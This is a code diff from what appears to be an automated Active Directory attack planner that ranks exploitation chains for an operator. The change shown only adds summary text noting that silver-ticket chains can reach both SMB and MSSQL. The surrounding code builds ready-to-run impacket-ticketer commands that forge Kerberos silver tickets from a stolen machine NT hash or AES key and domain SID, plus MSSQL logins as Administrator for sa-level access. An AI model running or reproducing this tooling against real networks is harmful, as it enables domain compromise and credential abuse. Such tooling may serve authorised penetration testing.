@@ -865,8 +865,13 @@ def run(report, store, ui=None):
                     f"'{_dom_sv}/Administrator@{host_short}.{_dom_sv}' "
                     f"-windows-auth   # sa-tier access via ticket",
                 ]
+            # iter-142: reflect MSSQL variant in summary so the ranked
+            # scoreboard shows the operator BOTH targets available.
+            _sv_summary = (f"machine hash {host_short}$ -> silver ticket "
+                           f"forgery for {host_short}"
+                           + (" (SMB + MSSQL)" if _mssql_here else ""))
             chains.append(Chain("R-SILVER", "silver ticket",
-                f"machine hash {host_short}$ -> silver ticket forgery for {host_short}",
+                _sv_summary,
                 crit=9, conf=0.9, ready=1.4, prox=0.9,      # score 10.2
                 commands=[
                     f"impacket-ticketer -nthash {h} -domain-sid {_sid_sv} "
@@ -1217,8 +1222,11 @@ def run(report, store, ui=None):
                     f"'{_ptk_dom}/Administrator@{_host_short}.{_ptk_dom}' "
                     f"-windows-auth",
                 ]
+            _sv_summary_ae = (f"machine AES key {_ptk_user} -> silver ticket "
+                              f"forgery for {_host_short}"
+                              + (" (SMB + MSSQL)" if _mssql_here_ae else ""))
             chains.append(Chain("R-SILVER", "silver ticket via machine AES key",
-                f"machine AES key {_ptk_user} -> silver ticket forgery for {_host_short}",
+                _sv_summary_ae,
                 crit=9, conf=0.9, ready=1.4, prox=0.9,       # score 10.2
                 commands=[
                     f"impacket-ticketer -aesKey {_ev.hash} "
